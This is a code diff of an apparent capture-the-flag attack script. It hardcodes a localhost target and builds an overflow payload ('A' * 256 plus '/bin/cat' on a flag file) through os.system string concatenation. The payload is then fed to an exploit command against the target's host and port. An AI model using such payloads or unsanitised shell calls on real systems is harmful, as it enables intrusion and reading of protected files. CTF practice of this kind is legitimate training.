@@ -104,17 +104,34 @@ def cattack(service_id, inputargs):
     global target_list
     temp_flags = []
     try:
-        target_service = session.get_targets(service_id)
-        target_list = target_service['targets']
+        # target_service = session.get_targets(service_id)
+        # target_list = target_service['targets']
+        target_list = [{
+                            "port": 5000,
+                            "hostname": "localhost",
+                            "flag_id": "asjhasbdakhsb"
+                        }]
         for each in target_list:
             try:
                 port = str(each["port"])
                 host = str(each["hostname"])
                 flag_id = str(each["flag_id"])
-                # flag_id = 
+                # python -c 'print "A" * 256 + "/bin/cat asjhasbdakhsb" '
+                first = '''python -c 'print ''' 
+                middle = '''"A" * 256 + "/bin/cat '''
+                last =  flag_id + '''"''' + ''' ' ''' + "> binary_file/trial.txt "
+                os.system(first + middle + last)
+                with open("binary_file/trial.txt", "r") as response:
+                    temp = response.readlines()
+
+                if temp[0][-2:] == "\n":
+                    temp[0] = temp[0][:-2]
+
+                stackargs = temp[0]
+
                 with open("binary_file/file.txt","w") as file:
                     file.write(inputargs)
-                    file.write("\n"+flag_id)
+                    file.write("\n"+stackargs)
                     # Write additional parameters
                 file.close()
                 cmd = exploit().format(host, port)
